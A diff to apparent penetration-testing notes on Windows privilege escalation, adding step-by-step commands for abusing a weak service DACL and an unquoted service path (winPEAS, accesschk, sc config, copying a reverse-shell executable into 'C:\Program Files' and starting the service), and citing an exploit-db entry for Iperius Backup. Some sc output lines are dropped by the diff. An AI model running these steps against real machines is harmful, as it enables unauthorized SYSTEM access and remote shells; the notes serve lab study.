@@ -288,14 +288,13 @@ sc query daclsvc
 Reconfigure the service to use our reverse shell executable:
 sc config daclsvc binpath= "\"c:\Privesc\rev.exe\""
 
-Start a listener on Kali, and then start the service to trigger the
-exploit:
+Start a listener on Kali, and then start the service to trigger the exploit:
 QueryServiceConfig SUCCESS                                                                                                  
                                                                                                                                  
 SERVICE_NAME: daclsvc                                                                                                            
-        TYPE               : 10  WIN32_OWN_PROCESS                                                                               
-        START_TYPE         : 3   DEMAND_START                                                                                    
-        ERROR_CONTROL      : 1   NORMAL                                                                                          
+        TYPE               : 10  WIN32_OWN_PROCESS                                       
+
+
         BINARY_PATH_NAME   : "c:\Privesc\rev.exe"                                                                                
         LOAD_ORDER_GROUP   :                                                                                                     
         TAG                : 0                                                                                                   
@@ -315,8 +314,34 @@ someproge.exe arg1 arg2 arg3...
 ```
 This behavior leads to the ambiguity when using the absolute paths that are unquoted and contain spaces. Consider the following unquoted path:
 C:\Program Files\Some Dir\SomeProgram.exe
-To us, this obviously runs SomeProgram.exe. To Windows, C:\Program could be the executable, with two arguments: “Files\Some” and “Dir\ SomeProgram.exe” Windows resolves this ambiguity by checking each of the possibilities in turn.If we can write to a location Windows checks before the actual executable, we can trick the service into executing it instead.
+To us, this obviously runs SomeProgram.exe. To Windows, C:\Program could be the executable, with two arguments: “Files\Some” and “Dir\ SomeProgram.exe” Windows resolves this ambiguity by checking each of the possibilities in turn.
 
+If we can write to a location Windows checks before the actual executable, we can trick the service into executing it instead.
+
+### Privilege Escalations:
+
+accesschk.exe /accepteula -ucqv user unquotedsvc
+```bash
+
+#Run winPEAS to check for service misconfigurations:
+.\winPEASany.exe quiet servicesinfo
+#Note that the “unquotedsvc” service has an unquoted path that also contains spaces:
+
+C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
+
+#Confirm this using sc:
+sc qc unquotedsvc
+
+# Use accesschk.exe to check for write permissions:
+.\accesschk.exe /accepteula -uwdq C:\
+.\accesschk.exe /accepteula -uwdq "C:\Program Files\"
+.\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+# Copy the reverse shell executable and rename it appropriately:
+copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path
+Service\Common.exe"
+# Start a listener on Kali, and then start the service to trigger the exploit:
+net start unquotedsvc
+```
 
 ### Iperius Backup 6.1.0 - Privilege Escalation
 Scenario: On a VNC accessible machine this service is running. Use the exploit [46863](https://www.exploit-db.com/exploits/46863) in exploitdb.
